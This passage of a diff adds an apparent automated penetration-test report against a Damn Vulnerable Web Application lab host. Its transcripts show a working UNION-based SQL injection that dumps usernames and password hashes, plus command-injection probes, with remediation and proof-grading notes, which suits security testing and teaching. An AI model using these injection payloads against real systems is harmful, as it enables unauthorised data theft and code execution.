+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;</pre></details><details><summary>Transcript r14: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+3--+-&amp;Submit=Submit -> 200</summary><pre>&lt;pre&gt;Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;&lt;/pre&gt;</pre></details><details><summary>Transcript r15: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+LIMIT+5--+-&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1&#x27; UNION SELECT user, password FROM users LIMIT 5-- -&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;&lt;pre&gt;ID: 1&#x27; UNION SELECT user, password FROM users LIMIT 5-- -&lt;br /&gt;First name: admin&lt;br /&gt;Surname: 5f4dcc3b5aa765d61d8327deb882cf99&lt;/pre&gt;&lt;pre&gt;ID: 1&#x27; UNION SELECT user, password FROM users LIMIT 5-- -&lt;br /&gt;First name: gordonb&lt;br /&gt;Surname: e99a18c428cb38d5f260853678922e03&lt;/pre&gt;&lt;pre&gt;ID: 1&#x27; UNION SELECT user, password FROM users LIMIT 5-- -&lt;br /&gt;First name: 1337&lt;br /&gt;Surname: 8d3533d75ae2c3966d7e0d4fcc69216b&lt;/pre&gt;&lt;pre&gt;ID: 1&#x27; UNION SELECT user, password FROM users LIMIT 5-- -&lt;br /&gt;First name: pablo&lt;br /&gt;Surname: 0d107d09f5bbe40cade3de5c71e9e9b7&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injec</pre></details><p><b>Remediation</b><br>Use parameterised queries; never concatenate request values into SQL.</p><details><summary><b>Proof grade: proven</b></summary><p class='meta'>Requirement for sqli: the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read</p><ul><li>&#10003; proof read from the wire</li><li>&#10003; the target produced the quoted bytes &mdash; <i>from r15</i></li><li>&#10003; data store fingerprinted &mdash; <i>You have an error in your SQL syntax in r2</i></li><li>&#10003; the query named its target &mdash; <i>users in r15</i></li><li>&#10003; the rows are not what the page serves anyway &mdash; <i>5f4dcc3b5aa765d61d8327deb882cf99 in r15 and in no control</i></li><li>&#10003; rows returned, not an error message &mdash; <i>quoted from r15</i></li><li>&#10003; extraction stayed minimal</li></ul></details></div><div class='finding' style='border-left-color:#7c1d1d'><h3>F02 - OS command injection in /vulnerabilities/exec ip parameter</h3><p><span class='badge' style='background:#7c1d1d'>CRITICAL</span> <span class='badge' style='background:#1e7b34'>PROOF: PROVEN</span> &nbsp; <b>Category:</b> rce &nbsp; <b>Endpoint:</b> <code>http://192.168.223.221:8081</code> &nbsp; <b>CWE:</b> <code>CWE-78</code> &nbsp; <b>OWASP:</b> A03 Injection</p><p><b>Description</b><br>The `ip` field reaches a shell: `id` output came back with this probe&#x27;s own nonce, proving execution rather than reflection.</p><p><b>Proof (verbatim excerpt)</b></p><pre>uid=33(www-data)</pre><details><summary>Transcript r16: POST http://192.168.223.221:8081/vulnerabilities/exec/ -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: Command Injection&lt;/h1&gt;
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;h2&gt;Ping a device&lt;/h2&gt;
+
+		&lt;form name=&quot;ping&quot; action=&quot;#&quot; method=&quot;post&quot;&gt;
+			&lt;p&gt;
+				Enter an IP address:
+				&lt;input type=&quot;text&quot; name=&quot;ip&quot; size=&quot;30&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.078 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.086 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.084 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.178 ms
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 0.078/0.106/0.178/0.041 ms
+&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution&quot; target=&quot;_blank&quot;&gt;http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.ss64.com/bash/&quot; target=&quot;_blank&quot;&gt;http://www.ss64.com/bash/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.ss64.com/nt/&quot; target=&quot;_blank&quot;&gt;http://www.ss64.com/nt/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Command_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/Command_Injection&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;p</pre></details><details><summary>Transcript r17: POST http://192.168.223.221:8081/vulnerabilities/exec/ -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: Command Injection&lt;/h1&gt;
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;h2&gt;Ping a device&lt;/h2&gt;
+
+		&lt;form name=&quot;ping&quot; action=&quot;#&quot; method=&quot;post&quot;&gt;
+			&lt;p&gt;
+				Enter an IP address:
+				&lt;input type=&quot;text&quot; name=&quot;ip&quot; size=&quot;30&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;PING 127.0.0.2 (127.0.0.2): 56 data bytes
+64 bytes from 127.0.0.2: icmp_seq=0 ttl=64 time=0.186 ms
+64 bytes from 127.0.0.2: icmp_seq=1 ttl=64 time=0.086 ms
+64 bytes from 127.0.0.2: icmp_seq=2 ttl=64 time=0.072 ms
+64 bytes from 127.0.0.2: icmp_seq=3 ttl=64 time=0.055 ms
+--- 127.0.0.2 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 0.055/0.100/0.186/0.051 ms
+&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution&quot; target=&quot;_blank&quot;&gt;http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.ss64.com/bash/&quot; target=&quot;_blank&quot;&gt;http://www.ss64.com/bash/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.ss64.com/nt/&quot; target=&quot;_blank&quot;&gt;http://www.ss64.com/nt/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Command_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/Command_Injection&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;p</pre></details><details><summary>Transcript r18: POST http://192.168.223.221:8081/vulnerabilities/exec/ -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
